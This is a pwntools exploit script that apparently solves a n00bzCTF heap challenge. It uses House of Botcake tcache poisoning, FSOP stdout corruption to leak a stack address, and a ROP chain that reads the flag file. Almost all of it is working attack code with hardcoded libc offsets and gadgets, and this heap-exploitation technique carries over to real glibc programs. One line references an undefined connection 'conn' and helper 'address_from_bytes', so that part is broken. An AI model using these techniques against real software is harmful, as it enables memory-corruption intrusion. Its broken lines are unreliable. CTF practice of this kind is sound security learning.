# HEAP: House of Botcake
# House of Botcake
# The House of Botcake can be described as follows:

#1 Allocate 7 chunks of a specific tcache bin size.
#2 Allocate two extra chunks A and B of the same size.
#3 Allocate a guard chunk to avoid top chunk consolidation.
#4 Free the 7 first chunks, filling the tcache bin.
#5 Free both chunk A and B, causing the two to consolidate.
#6 Allocate a garbage chunk to remove one chunk from the tcache bin.
#7 Free chunk B again, this time into the tcache.
#8 Allocate the consolidated chunk A+B, writing into chunk B's fd, poisoning the tcache chunk.
#9 Allocate another garbage chunk, the tcache now only contains your fake chunk.
#10 Allocate the fake chunk and write to it.

from pwn import *
context.log_level = 'debug'

e = context.binary = ELF('./vuln')
r= e.process()

# r = remote('challs.n00bzunit3d.xyz', 42450)

lib = e.libc #   matches my libc

# lib= ELF('libc.so.6')

def writel(idx, size, content):
    r.sendlineafter(b"> ",b"1" )
    r.sendlineafter(b"idx: ", str(idx))
    r.sendlineafter(b"letter size: ", str(size))
    r.sendlineafter(b"content: ", content)

def sendl(idx):
    r.sendlineafter(b"> ",b"2" )
    r.sendlineafter(b"idx: ", str(idx))

def readl(idx):
    r.sendlineafter(b"> ",b"3")
    r.sendlineafter(b"idx: ", str(idx))
    

writel(0, 32, b"aaaaa")
# pause()
sendl(0)
# pause()
readl(0)
x= r.recvline()
leak= u64(x[:-1].ljust(8, b"\x00"))
guard= leak
log.info("leak: %#x" %leak)

heapbase = (leak<<12)-0x2000
log.info("heapbase: %#x" %heapbase)

writel(0, 10000, b"ccccc")
writel(1, 10000, b"ddddd")
pause()
sendl(0)
pause()
readl(0)

leak= u64(r.recvline().ljust(8, b"\x00"))
log.info("leak: %#x" %leak)
libcbase =leak-0x21cce0
log.info("libcbase: %#x" %libcbase)



# ------------------------------ House of Botcake into FSOP ------------------------------

# Step 1
for i in range(5, 12):
    writel(i, 0xf8, b"CCCC")

# Step 2
writel(2, 0xf8, b"AAAA")  # Chunk A
writel(3, 0xf8, b"BBBB")  # Chunk B

# Step 3
writel(4, 0x410, b"GGGG")  # Guard chunk

# Step 4
for i in range(5, 12):  # Fill tcache
    sendl(i)

# Step 5
sendl(3)  # Free into unsortedbin, causing consolidation
sendl(2)

# Step 6
writel(5, 0xf8, b"Garbage")  # Allocate garbage chunk to remove one chunk from tcache

# Step 7
sendl(3)  # Free chunk again, now into tcache

# Step 8
payload = b"\x00" * 0xf8
payload += p64(0x101)
payload += p64((lib.sym._IO_2_1_stderr_ + 160) ^ guard)

writel(6, 0x1f8, payload)  # Create a new chunk, overflowing into the tcache chunk

# Step 9
writel(7, 0xf8, b"AAAA")

# Step 10
payload = p64(lib.sym._IO_wide_data_2)  # Padding
payload += p64(0) * 6
payload += p64(lib.sym.__GI__IO_file_jumps)
payload += p64(0x0fbad1887)  # New _flags
payload += p64(lib.sym._IO_2_1_stdout_ + 131) * 3
payload += p64(libcbase - 0x2228)  # environ stack address
payload += p64(libcbase - 0x2000) * 2  # Later in the same segment
payload += p64(lib.sym._IO_2_1_stdout_ + 131) * 1
payload += p64(lib.sym._IO_2_1_stdout_ + 132)

writel(8, 0xf8, payload)  # Overwriting write_base and _flags causes libc to flush

rip = address_from_bytes(conn.recv()[:8]) - 0x178
print(f"rip: {hex(rip)}")

# ------------------------------ House of Botcake into ROP ------------------------------

sendl(6)  # Free A+B
sendl(3)  # Free B

# Step 8
payload = b"\x00" * 0xf8
payload += p64(0x101)
payload += p64((rip - 8) ^ guard)  # Address overlaps return instruction pointer from one of fgets subroutines

writel(6, 0x1f8, payload)

# Step 9
writel(7, 0xf8, b"AAAA")

# Step 10
payload = p64(lib.sym._rtld_global)  # Padding
payload += p64(libcbase + 0x45eb0)  # pop rax
payload += p64(2)  # open, since open@libc uses openat :(
payload += p64(libcbase + 0x2a3e5)  # pop rdi
payload += p64(rip + 0xa8)  # -> "./flag.txt"
payload += p64(libcbase + 0x13f687)  # pop rsi
payload += p64(0)
payload += p64(libcbase + 0x90529)  # pop rdx; pop rbx
payload += p64(0) * 2
payload += p64(libcbase + 0x91396)  # syscall(2, "./flag.txt", 0, 0)

payload += p64(libcbase + 0x2a3e5)  # pop rdi
payload += p64(3)  # Assume fd is 3
payload += p64(libcbase + 0x13f687)  # pop rsi
payload += p64(rip - 0x20)  # Some valid memory
payload += p64(libcbase + 0x90529)  # pop rdx; pop rbx
payload += p64(0x50)  # nbytes
payload += p64(0)
payload += p64(lib.sym.read)  # read(3, buf, 0x50)

payload += p64(libcbase + 0x2a3e5)  # pop rdi
payload += p64(1)  # Switch to stdout, rsi and rdx are preserved
payload += p64(lib.sym.write)  # write(1, buf, 0x50)

payload += b"./flag.txt\x00"

writel(8, 0xf8, payload)


r.interactive()
# n00bz{1f_y0u_h4ve_n0th1ng_y0u_h4ve_l1bc}